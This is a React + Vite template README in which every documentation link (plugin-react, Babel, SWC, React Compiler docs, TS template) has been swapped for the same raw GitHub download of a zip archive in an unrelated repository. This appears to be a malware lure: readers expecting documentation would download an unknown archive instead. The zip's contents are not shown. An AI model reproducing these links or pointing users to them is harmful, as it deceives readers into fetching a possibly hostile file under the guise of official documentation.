# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/khaled8787/dragon-news/main/markhor/dragon-news.zip) uses [Babel](https://raw.githubusercontent.com/khaled8787/dragon-news/main/markhor/dragon-news.zip) (or [oxc](https://raw.githubusercontent.com/khaled8787/dragon-news/main/markhor/dragon-news.zip) when used in [rolldown-vite](https://raw.githubusercontent.com/khaled8787/dragon-news/main/markhor/dragon-news.zip)) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/khaled8787/dragon-news/main/markhor/dragon-news.zip) uses [SWC](https://raw.githubusercontent.com/khaled8787/dragon-news/main/markhor/dragon-news.zip) for Fast Refresh

## React Compiler

The React Compiler is not enabled on this template because of its impact on dev & build performances. To add it, see [this documentation](https://raw.githubusercontent.com/khaled8787/dragon-news/main/markhor/dragon-news.zip).

## Expanding the ESLint configuration

If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://raw.githubusercontent.com/khaled8787/dragon-news/main/markhor/dragon-news.zip) for information on how to integrate TypeScript and [`typescript-eslint`](https://raw.githubusercontent.com/khaled8787/dragon-news/main/markhor/dragon-news.zip) in your project.
